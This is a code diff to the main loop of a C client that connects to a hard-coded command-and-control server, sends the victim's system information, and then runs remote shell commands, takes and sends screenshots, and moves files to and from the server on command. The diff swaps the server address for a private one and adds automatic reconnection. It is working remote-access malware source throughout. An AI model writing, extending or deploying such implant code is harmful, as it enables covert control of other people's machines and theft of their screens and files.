@@ -11,7 +11,7 @@
 #include "common.h"
 #include "client/info.h"
 
-#define SERVER_IP "103.70.12.50"
+#define SERVER_IP "192.168.100.100"
 
 int main() {
     SOCK_INIT();
@@ -25,45 +25,45 @@ int main() {
     serv.sin_port = htons(C2_PORT);
     inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);
 
+connect:
     // Attempt to connect to c2server
     while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
+        printf("[DEBUG] Attempting to connect to server");
         sleep(3);
     }
 
     // Send client info upon first time connecting
     char* client_info = print_client_info();
-    safe_send_payload(sock, client_info, strlen(client_info) + 1, 0);
+    safe_send(sock, client_info, SYS_INFO_CMD, strlen(client_info) + 1, 0);
     free(client_info);
 
     // Main loop
     while (1) {
-        char cmd;
+        int cmd = 0;
 
         // Getting initial command
-        if (safe_recv(sock, &cmd, 1, 0) <= 0) {
-            sleep(3);
-            continue; 
+        char* payload = (char*)safe_recv(sock, &cmd, NULL, 0);
+        if (payload == NULL) {
+            goto connect; // Stupid 
         }
 
-        if (cmd == '1') {
-            // Receive and exec command
-            psh_receive(sock);
-        } else if (cmd == '2') {
+        if (cmd == PSH_CMD) {
+            psh_exec(sock, payload);
+        } else if (cmd == SCREEN_CMD) {
             // Take screenshot and send raw file to server
             size_t size = 0;
             BYTE* buffer = SaveScreenshot(&size);
             if (!buffer || size == 0) {
                 printf("[ERR] Taking screenshot failed.\n");
-                continue;
             }
-
-            safe_send_payload(sock, buffer, size, 0);
+            safe_send(sock, buffer, SCREEN_CMD, size, 0);
             free(buffer);
-        } else if (cmd == '3') {
-            upload_file_to_server(sock);
-        } else if (cmd == '4') {
-            download_file_from_server(sock);
-        } 
+        } else if (cmd == DL_FILE_CMD) {
+            upload_file_to_server(sock, payload);
+        } else if (cmd == UL_FILE_CMD) {
+            download_file_from_server(sock, payload);
+        }
+        free(payload);
     }
 
     CLOSE_SOCK(sock);
